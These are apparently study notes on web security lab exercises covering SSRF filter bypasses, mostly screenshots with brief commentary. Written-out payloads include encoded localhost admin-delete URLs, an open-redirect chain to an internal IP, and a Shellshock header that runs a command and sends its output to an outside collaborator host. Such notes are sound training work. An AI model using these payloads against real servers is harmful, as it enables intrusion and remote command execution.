
# Basic SSRF against the local server
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos
![[Pasted image 20230301202100.png]]
![[Pasted image 20230301202111.png]]
![[Pasted image 20230301202134.png]]
![[Pasted image 20230301202212.png]]
requesting to delete the user we get 401 Unauthorized but the delete is sent in form of GET request so we can repeat our SSRF using delete url to delete it
![[Pasted image 20230301203123.png]]
![[Pasted image 20230301203235.png]]
![[Pasted image 20230301203227.png]]

# Basic SSRF against another back-end system
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

Using intruder to fuzz ip's
![[Pasted image 20230301204655.png]]

![[Pasted image 20230301204053.png]]

![[Pasted image 20230301204704.png]]
doing same as last challenge
![[Pasted image 20230301204747.png]]

# SSRF with blacklist-based input filter
his lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

found out that blacklist doesn't prevent 127.1 which is same as 127.0.0.1

![[Pasted image 20230301210809.png]]
![[Pasted image 20230301210830.png]]
looks like admin is also blacklisted we can double url encode it to bypass filter
![[Pasted image 20230301211615.png]]
`http://127.1%2f%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
![[Pasted image 20230301211716.png]]
`http://127.1%2f%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos`


# SSRF with filter bypass via open redirection vulnerability
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

![[Pasted image 20230301213147.png]]
![[Pasted image 20230301213215.png]]
we can abuse the redirect to do SSRF
changing path to other site url


![[Pasted image 20230301213929.png]]
![[Pasted image 20230301213939.png]]
it worked
taking the redirecting path and add it to stockAPI
![[Pasted image 20230301214138.png]]
![[Pasted image 20230301214250.png]]
`/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp://192.168.0.12:8080/admin`
`/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp://192.168.0.12:8080/admin/delete?username=carlos`


# SSRF with whitelist-based input filter
![[Pasted image 20230302171012.png]]
`http://127.0.0.1:80%25%32%33@stock.weliketoshop.net`
using # and double encoding it 
![[Pasted image 20230302172554.png]]
`http://127.0.0.1:80%25%32%33@stock.weliketoshop.net/admin`

# Blind SSRF with Shellshock exploitation
[Blind SSRF.pdf](https://www.safe.security/assets/img/research-paper/pdf/Blind%20SSRF.pdf)
`() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net`

# Routing-based SSRF
changing  Host header to the target ip address range and send it to intruder
![[Pasted image 20230302182120.png]]

![[Pasted image 20230302182140.png]]
found 302 
change all requests to be Host to be 192.168.0.152
getting csrf token from page
![[Pasted image 20230302183552.png]]
![[Pasted image 20230302183847.png]]
